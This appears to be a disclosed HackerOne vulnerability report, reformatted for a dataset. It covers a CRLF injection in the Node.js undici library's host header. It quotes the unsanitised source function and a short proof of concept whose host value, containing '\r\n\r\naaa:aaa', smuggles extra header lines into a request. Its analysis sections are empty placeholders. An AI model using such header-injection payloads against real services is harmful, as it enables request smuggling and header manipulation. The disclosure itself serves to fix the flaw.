---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '1820955'
original_report_id: '1820955'
title: CRLF Injection in Nodejs ‘undici’ via host
weakness: CRLF Injection
team_handle: nodejs
created_at: '2023-01-03T12:18:52.159Z'
disclosed_at: '2023-02-22T03:46:24.179Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 11
asset_identifier: https://github.com/nodejs/node
asset_type: SOURCE_CODE
max_severity: critical
tags:
- hackerone
- crlf-injection
---

# CRLF Injection in Nodejs ‘undici’ via host

## Metadata

- HackerOne Report ID: 1820955
- Weakness: CRLF Injection
- Program: nodejs
- Disclosed At: 2023-02-22T03:46:24.179Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

**Summary:** undici library should be protects HTTP headers from CRLF injection vulnerabilities. However, CRLF injection exists in the ‘host’ header of undici.request api.


**Description:**
like https://hackerone.com/reports/1664019
Source code:
lib/core/request.js:296
```javascript
function processHeader (request, key, val) {
  if (val && (typeof val === 'object' && !Array.isArray(val))) {
    throw new InvalidArgumentError(`invalid ${key} header`)
  } else if (val === undefined) {
    return
  }

  if (
    request.host === null &&
    key.length === 4 &&
    key.toLowerCase() === 'host'
  ) {
    // Consumed by Client
    request.host = val // without headerCharRegex.exec(val)
  } else if (
    request.contentLength === null &&
...
```
Example:
```javascript
import { request } from 'undici'

const unsanitizedContentTypeInput =  '12 \r\n\r\naaa:aaa'

const {
    statusCode,
    headers,
    trailers,
    body
} = await request('http://127.0.0.1:23333', {
    method: 'GET',
    headers: {
        'content-type': 'application/json',
        'host': unsanitizedContentTypeInput
    }
})

console.log('response received', statusCode)
console.log('headers', headers)

for await (const data of body) {
    console.log('data', data)
}

console.log('trailers', trailers)

```
{F2100713}

## Impact: 
```<=undici@5.14.0```

## Impact

```<=undici@5.14.0```

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
